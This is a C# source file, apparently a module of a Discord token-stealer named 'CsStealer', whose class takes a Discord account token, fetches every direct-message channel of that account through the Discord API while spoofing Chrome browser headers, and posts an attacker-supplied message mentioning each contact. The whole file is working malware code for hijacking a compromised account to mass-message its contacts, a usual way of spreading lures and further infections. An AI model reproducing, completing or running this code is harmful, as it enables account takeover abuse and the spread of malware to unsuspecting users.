using System;
using System.Net.Http;
using System.Diagnostics;
using System.Text;
using System.Text.Json.Nodes;

namespace CsStealer
{
    class DiscordDMall
    {
        public static string DiscordMsgsAPI = "https://discord.com/api/v9/channels/<UserID>/messages";
        public static string DiscordDmsAPI = "https://discord.com/api/v9/users/@me/channels";
        public static string OutputDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "TmpDatas");

        public async static Task Start(string Token, string Message)
        {
            Dictionary<string, string> Headers = new Dictionary<string, string>
        {
            { "Authorization", Token },
            { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" },
            { "Accept", "*/*" },
            { "Accept-Language", "en-US,en;q=0.9,fr;q=0.8" },
            { "Accept-Encoding", "gzip, deflate, br, zstd" },
            { "Origin", "https://discord.com" },
            { "Referer", "https://discord.com/channels/@me" },
            { "Sec-Fetch-Dest", "empty" },
            { "Sec-Fetch-Mode", "cors" },
            { "Sec-Fetch-Site", "same-origin" },
            { "Sec-Ch-Ua", "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"" },
            { "Sec-Ch-Ua-Mobile", "?0" },
            { "Sec-Ch-Ua-Platform", "\"Windows\"" },
            { "X-Debug-Options", "bugReporterEnabled" },
            { "X-Discord-Locale", "en-US" },
            { "X-Discord-Timezone", "America/New_York" },
            { "Connection", "keep-alive" },
            { "Cache-Control", "no-cache" },
            { "Pragma", "no-cache" }
        };

            List<string> DMIDs = await GetUserDms(Token);

            using (HttpClient client = new HttpClient())
            {
                foreach (KeyValuePair<string, string> Header in Headers)
                {
                    client.DefaultRequestHeaders.TryAddWithoutValidation(Header.Key, Header.Value);
                }

                foreach (string ID in DMIDs)
                {
                    string Url = DiscordMsgsAPI.Replace("<UserID>", ID);

                    string _Payload = $@"{{
                                        ""content"": ""{Message.Replace("<UserMention>", $"<@{ID}>").Replace("\\n", "\n")}"",
                                        ""mobile_network_type"": ""cellular"",
                                        ""flags"": 0
                                    }}";

                    var Payload = new StringContent(_Payload, Encoding.UTF8, "application/json");

                    HttpResponseMessage Resp = await client.PostAsync(Url, Payload);

                    if (Resp.IsSuccessStatusCode)
                    {
                        Debugger.Debug("INFO", "Sent to user " + ID.ToString());
                    }
                    else
                    {
                        Debugger.Debug("ERROR", "Coudl'nt send to user " + ID.ToString());
                    }
                }
            }
        }

        private async static Task<List<string>> GetUserDms(string Token)
        {
            var headers = new Dictionary<string, string>
        {
            { "Authorization", Token },
            { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" },
            { "Accept", "*/*" },
            { "Accept-Language", "en-US,en;q=0.9,fr;q=0.8" },
        };

            using var client = new HttpClient();

            foreach (var header in headers)
            {
                client.DefaultRequestHeaders.TryAddWithoutValidation(header.Key, header.Value);
            }

            var response = await client.GetAsync(DiscordDmsAPI);

            if (!response.IsSuccessStatusCode)
                return new List<string>();

            string content = await response.Content.ReadAsStringAsync();

            var root = JsonNode.Parse(content)?.AsArray();

            if (root == null)
                return new List<string>();

            var dmIds = new List<string>();

            foreach (var data in root)
            {
                var idNode = data?["id"];
                if (idNode != null)
                    dmIds.Add(idNode.ToString());
            }

            return dmIds;
        }
    }
}